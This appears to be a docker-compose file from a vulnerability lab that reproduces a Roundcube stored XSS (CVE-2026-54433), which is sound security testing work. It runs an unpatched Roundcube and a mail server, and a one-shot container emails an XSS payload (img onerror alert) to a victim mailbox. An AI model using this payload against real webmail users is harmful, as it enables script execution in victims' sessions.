@@ -1,0 +1,101 @@
+# =============================================================================
+# vt-2026-54433 — Roundcube Webmail zero-click stored XSS in plain-text
+# rendering via crafted mailto-like address (CVE-2026-54433)
+# =============================================================================
+# Real, unmodified Roundcube 1.7.1 (last vulnerable 1.7.x release), pinned
+# and mirrored to ghcr.io/happyhackingspace/vt-2026-54433 for reproducible
+# pulls, backed by a disposable SQLite DB and a disposable auth-disabled
+# GreenMail mail server (SMTP+IMAP) so the lab needs no manual provisioning.
+# An init container SMTP-delivers one crafted plain-text email to the
+# victim mailbox — the exact regression-test payload from Roundcube's own
+# fix commit (4c278f4868c67b163567cae3d74e58d872913459). Local lab only —
+# do not expose publicly.
+# =============================================================================
+
+services:
+  mail:
+    image: greenmail/standalone:2.1.3
+    container_name: vt-2026-54433-mail
+    restart: unless-stopped
+    environment:
+      GREENMAIL_OPTS: "-Dgreenmail.setup.test.smtp -Dgreenmail.setup.test.imap -Dgreenmail.hostname=0.0.0.0 -Dgreenmail.auth.disabled -Dgreenmail.verbose"
+    networks:
+      - vt-net
+
+  roundcube:
+    image: ghcr.io/happyhackingspace/vt-2026-54433:latest
+    pull_policy: always
+    container_name: vt-2026-54433-web
+    restart: unless-stopped
+    depends_on:
+      - mail
+    environment:
+      ROUNDCUBEMAIL_DB_TYPE: sqlite
+      ROUNDCUBEMAIL_DEFAULT_HOST: mail
+      ROUNDCUBEMAIL_DEFAULT_PORT: "3143"
+      ROUNDCUBEMAIL_SMTP_SERVER: mail
+      ROUNDCUBEMAIL_SMTP_PORT: "3025"
+      ROUNDCUBEMAIL_SKIN: elastic
+    ports:
+      - "8543:80"
+    healthcheck:
+      test: ["CMD", "curl", "-fsS", "http://127.0.0.1/"]
+      interval: 5s
+      timeout: 5s
+      retries: 30
+      start_period: 15s
+    networks:
+      - vt-net
+    labels:
+      - "vuln.cve=CVE-2026-54433"
+      - "vuln.product=roundcube"
+      - "vuln.severity=high"
+      - "org.opencontainers.image.source=https://github.com/HappyHackingSpace/vt-templates"
+      - "org.opencontainers.image.title=vt-2026-54433"
+
+  # One-shot: SMTP-deliver the crafted plain-text message to the victim
+  # mailbox (victim@lab.local), simulating an attacker sending mail in.
+  mail-init:
+    image: python:3.12-slim
+    container_name: vt-2026-54433-mail-init
+    depends_on:
+      - mail
+    entrypoint: ["python3", "-c"]
+    command:
+      - |
+        import smtplib, socket, time
+        from email.mime.text import MIMEText
+
+        for _ in range(60):
+            try:
+                socket.create_connection(("mail", 3025), timeout=2).close()
+                break
+            except OSError:
+                time.sleep(2)
+        else:
+            raise SystemExit("mail server never came up")
+
+        body = 'a@a.co?]<img/src="x"/onerror=alert(document.domain)>'
+        msg = MIMEText(body, "plain")
+        msg["Subject"] = "Invoice"
+        msg["From"] = "attacker@evil.example"
+        msg["To"] = "victim@lab.local"
+
+        for _ in range(30):
+            try:
+                with smtplib.SMTP("mail", 3025, timeout=5) as s:
+                    s.sendmail("attacker@evil.example", ["victim@lab.local"], msg.as_string())
+                print("DELIVERED")
+                break
+            except Exception as e:
+                print("retry:", e)
+                time.sleep(2)
+        else:
+            raise SystemExit("delivery failed")
+    networks:
+      - vt-net
+    restart: "no"
+
+networks:
+  vt-net:
+    driver: bridge
